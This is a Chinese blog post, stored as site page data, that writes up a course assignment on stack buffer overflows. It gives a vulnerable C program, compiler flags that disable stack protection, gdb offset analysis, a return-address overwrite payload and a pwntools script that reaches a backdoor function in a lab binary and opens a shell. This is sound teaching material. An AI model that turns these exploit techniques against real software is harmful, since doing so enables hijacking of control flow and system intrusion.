{"componentChunkName":"component---src-pages-detail-tsx","path":"/detail/a3697df1-78f6-5a6a-a5b3-d50f08733cda","result":{"pageContext":{"html":"<h1>概述</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 407px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/5bf10/stack-frame.jpg\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 110.13513513513513%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAWABQDASIAAhEBAxEB/8QAGQABAAIDAAAAAAAAAAAAAAAAAAMEAQIF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAB71WxoTAxGEgP/8QAGBAAAwEBAAAAAAAAAAAAAAAAAAERAiD/2gAIAQEAAQUCMprXFIQ//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAFhAAAwAAAAAAAAAAAAAAAAAAAAEw/9oACAEBAAY/AhQ//8QAGhABAQEBAAMAAAAAAAAAAAAAAQARQSExkf/aAAgBAQABPyHdHJoRIkwbvrsGXUeUY6/b/9oADAMBAAIAAwAAABAzAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAEDAQE/EB//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAECAQE/EB//xAAbEAACAwEBAQAAAAAAAAAAAAABEQAhMXFRgf/aAAgBAQABPxBfOYgQRjOZGVlnkAjduxkDcUoiAnUQTJ7CBRZUUOAE0m4EEPqRn//Z'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"stack-frames\"\n        title=\"stack-frames\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/5bf10/stack-frame.jpg\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/a80bd/stack-frame.jpg 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/1c91a/stack-frame.jpg 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7c57d6fa56eaf230797133cab3ab0cfd/5bf10/stack-frame.jpg 407w\"\n        sizes=\"(max-width: 407px) 100vw, 407px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>软件漏洞分析课程的一次作业，利用了栈内存的缓冲区溢出，覆盖了返回地址，从而达到劫持控制流的目的。如果希望能具体了解一下图中 c 函数调用的实现，可以看一下 B 站上陈渝教授的这个视频。</p>\n<iframe style=\"margin-left: 50%;transform: translateX(-50%);width: 50vw;height: 40vw;\" src=\"//player.bilibili.com/player.html?aid=77228694&bvid=BV1mJ411X73U&cid=132102373&page=5\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>\n<h1>EXP1</h1>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-c line-numbers\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">function2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Executed chagned\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">function1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">function1</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Executed normally\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>使用<code>gdb</code>进行调试，<code>strcpy</code>函数可以被利用引起缓冲区溢出，目前的问题时需要多长的字符串，以及需要将<code>function1</code>栈帧的返回地址覆盖为什么</p>\n<p>环境</p>\n<blockquote>\n<p>ubuntu 16.04</p>\n<p>gcc 5.4.0</p>\n<p>gdb 7.11.1</p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/82e86/ubuntu-arch.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 49.32432432432432%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXUlEQVQoz4WRWY7jMAxEfYWJo1iWJVIbZWux5CSd3u5/sEHsxmA+Gt0AwQ+CD6wqdjJGaCu2VcwRwwZ2Nb6iq4aao1TKlSizEc8j9hx6DqdB9RzO+6Tbp3gagEuXtoenfAsZwE3StqXkck15s3Oxc5mQBHplZq7cwX/Byijt3Xp9K+0RKQlphTSPpcyUKG0CPJsMm8wg7SAtE/pQ0fUcucRcJTg4j0bqUO8f83qfpF1DDrFSbOijMrNA4sqBiwJJ7vc7E8pcWq5KAOz6pQmZ0gbgFh9DuflYpQ6a8mUyl8lw5S67BCZ0pymneisNuYITxz8crKbkFiY0G/VlMkzggR0+n33X/PTccxwklqYMARu1BPe6tNWn/kh4hH85Hwn/X1+BgYVA7j1tL7Gs2SmtT99tfwOfx+erhLQOQyDT7kKT6jkyoX+BeQgiR1HiYIK0FfxKsaCrmrbt5fNn+C/4UUmy0anAlQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"arch\"\n        title=\"arch\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/fcda8/ubuntu-arch.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/12f09/ubuntu-arch.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/e4a3f/ubuntu-arch.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/fcda8/ubuntu-arch.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/efc66/ubuntu-arch.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/c83ae/ubuntu-arch.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/615607ca0f0499a746f158e14fb991ef/82e86/ubuntu-arch.png 1978w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>关闭堆栈保护机制，使用<code>gcc</code>编译</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">gcc -g main.c -m32 -o main32 -z execstack -fno-stack-protector</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/a2ef2/gdb-debug.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.54054054054053%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACBElEQVQ4y41U2W7bMBDULyS2RYkUj13epG7Lju0kQND//6hCdtEGaKoU4ANJYLgzO7MspA77Su4rQYVxafB5tKGvud5X4lDL7VUIDIdaVg1WDKoGCQPCoGLr5nuwxLCvBJMWXfZ5DO0Uu9mETru25qakagsMNtdcl1QRBhx8oxwHz6Rh0lJhCFX7SvxLQtGN59hOEgNHj64VGLhyEgMVhoOnwtzlwJcUCu1bdFnpyGGtKTAoE5WOYLO8Xwr0ykQqzN/1C2USB19zLXUwoVMm2tgLDDXHmmNJ1dOBPZXNg/yO8M9PFCFPNvZgM9iENmvbruKVQ9c2ypZUaddq3xGmqDBoMwf/Bxy7eTxelU5UmOP5bZwvhCqfx8vrh4tD1eC4XI4vbxUDG/vr+w8bh9/FizQsuV8ewbCxN6ErqWLSSh1rsVoFJqHLJV0rg0mfxRexnVwcfJ6kThID3p17Js2O8B35pXNH+KGWX2hewWlI3TG0U8iT0mur7ybrRtntnBXKxPl0m083EzomLZgENuX+aPx6/CZhTJj59NqNZ7CJMJA6cHCxm3O/EAbPZbMJlnZarv30gq6lYnVbmdRNp/F4BZuUSRsTVjBppuXWjSd0mUmrdJQ6CvRSByp01eAG84KDn0+3fnqxob9zXhP6XDaPxm5PdeHSsFzetWuZtI/0/M838AD/BEcAhf6D2eZCAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"gdb\"\n        title=\"gdb\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/fcda8/gdb-debug.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/12f09/gdb-debug.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/e4a3f/gdb-debug.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/fcda8/gdb-debug.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/efc66/gdb-debug.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/c83ae/gdb-debug.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/d117136acea3a1946d7ab58de5f5c27a/a2ef2/gdb-debug.png 1970w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>可以得出<code>ebp</code>与<code>&#x26;buffer</code>相距 13 个字节，同时返回地址占用 4 个字节，<code>function2</code>的地址为<code>0x0804845B</code>。由于采用的是<code>小端存储</code>，因此需要将目标函数地址按字节倒序写入。构造出 payload<code>AAAAAAAAAAAAAAAAA\\x5B\\x84\\x04\\x08</code></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/691b3/stack-overlow-result.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.81081081081081%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAYklEQVQI113CUQ7CMAgA0J1B59ycwIC2pM4C8f6HM/768ib10AyNUHPScZSBcj6PDtyADdl2LDtVYHtgAW6knbSj2LLRpJ6aKe8h5tKyvT6kJ1evPS4LzCv+vd5/5xVvG30BAhkPvS6d+bwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"stack-overflow-result\"\n        title=\"stack-overflow-result\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/fcda8/stack-overlow-result.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/12f09/stack-overlow-result.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/e4a3f/stack-overlow-result.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/fcda8/stack-overlow-result.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/efc66/stack-overlow-result.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/c83ae/stack-overlow-result.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/aa363d0cd5cbcc6a9d437767e02adae0/691b3/stack-overlow-result.png 2156w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>成功调用了<code>function2</code>，同理地址也可以被改成其他的函数地址。</p>\n<h1>EXP2</h1>\n<p>已知一个<a href=\"https://raw.github.com/ChenKS12138/ChenKS12138.github.io/source-code/assets/stack-tutorial\">二进制文件</a>，通过 ida 静态调试。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/95c1f/stack-overflow-ida.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.48648648648649%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrklEQVQoz4XSS2+bQBAHcL7/F2mr9FAlUtP2UDtxXRMe5mHAvGxYAwZ7geVhE7OG3Sqh6aGqyl9zmMP8RnMYxlA5RVmr2lqQtaWi6/qaldXbH7M7Vr7hrQ+ce8PZdwuZZb9z/L1pzuecxEsq9zT//OmWEUxb4DnRdAzbcU1j69iqaQmazKr6o7T5IvJf1eDjU/JNCCzfAsDwAQjCvQc8WVYZxQKhv+vaHjft9XJtG5wd0kvdmCutROhUhmV2ig84q3pCKSGUvIa+hhF/Av9hc912FFAKaO/1uZJjF0/eTRMDvgA6jJKh3uRLw2hKvBO92jvRhNKEkpgc9WMbtNw9l3v5b/S24K8wyjZybHOfxMNKQggqEMZYUZWqruh/wyhuZOp6WZTDXaQnKEe4xZIklWU5ghcrR9fUI4RFWRRlgQrk+R5M4WQ6ifbRCJatMHD8run6575/7rumgxG8VBdhISCIRrA03yVshN0r9elQ7tQ9r8+z9zNowBH8OJWWEx6sdukmhQ6EDnQlN7Hi5YMIDH8EhzCL0zSrq7SqMpQdUphVFTqfsrqGBfrzD//EvwCvhJp7QyRFIwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"ida\"\n        title=\"ida\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/fcda8/stack-overflow-ida.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/12f09/stack-overflow-ida.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/e4a3f/stack-overflow-ida.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/fcda8/stack-overflow-ida.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/efc66/stack-overflow-ida.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/c83ae/stack-overflow-ida.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/6551ec9e82169a0ffc1d9fffe71d1295/95c1f/stack-overflow-ida.png 2330w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>vulnerable_function 中的 buffer 只需要 1 个字节，但是第五行的 read 函数可以输入 256 个字节，这里可能存在着栈溢出。根据第三行的注释推测，<code>&#x26;buffer</code>距离<code>ebp</code>位 0x30 个字节，猜测我们需要构造的 payload 为 52 字节的字符串再加上目标函数的地址，即<code>backdoor</code>函数的地址。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-python line-numbers\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\np<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./stack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nret_addr<span class=\"token operator\">=</span><span class=\"token number\">0x0804846B</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">52</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/0c3d0/stack-overflow-pwn-result.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 72.2972972972973%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABiElEQVQoz42SiW7bMAxA8wuLk9qSZR0UdR8+0jjY8v//NdjpmmIYmgEPgiDwiQTJgxorXhe8Lf6+wjxKU2y6ob9ov6BftJtNeEc/gY3gsvaZct32smOqY+qgfbV5NmFUNoErAkPLoCGiIeJERNM94Nv58cI/OVBhmHID+AG8xChNahmc9riXHHppJUahg7LJhBFcoQLPVLYM3nr1QhY6SIyEb0IvDNdeYGDKgc2UY9Px72QOXvsCLps44n55mfApa19cnkNZwOW9W+pM5YnI886fOPlvWdZq3hd5mWiJrTFUenAXgfUDXZWZJRaut3Z2DI7t8JSHEFWtrTUk+E4jFY5DZSr1KvZyg+vCdeKwTaSXlim7l/bIXCpOc1xXf73iOJkwpelnXe4YZp+vZfnFdXbp4tLky4Vw7OUXGV0xftQmuziBLRiqTdMAjgocwBGuf7yxphuO7cZjN55lh1DzvLo8sz20l5YKcyLyc42+6/a63styazrx+Pj4Svhrzo4IPLbD+f+Er/JvlmxnDFnIMAUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"EXP2-RESULT\"\n        title=\"EXP2-RESULT\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/fcda8/stack-overflow-pwn-result.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/12f09/stack-overflow-pwn-result.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/e4a3f/stack-overflow-pwn-result.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/fcda8/stack-overflow-pwn-result.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/efc66/stack-overflow-pwn-result.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/c83ae/stack-overflow-pwn-result.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/ddd146a87bcc0eff5a7e0e26db5d80a5/0c3d0/stack-overflow-pwn-result.png 1414w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>成功拿到 shell</p>","id":"a3697df1-78f6-5a6a-a5b3-d50f08733cda","headings":[{"value":"概述","depth":1},{"value":"EXP1","depth":1},{"value":"EXP2","depth":1}],"date":"Wednesday, September 16, 2020 3:59 PM","tags":["随笔"],"title":"栈溢出利用"}},"staticQueryHashes":["63159454"]}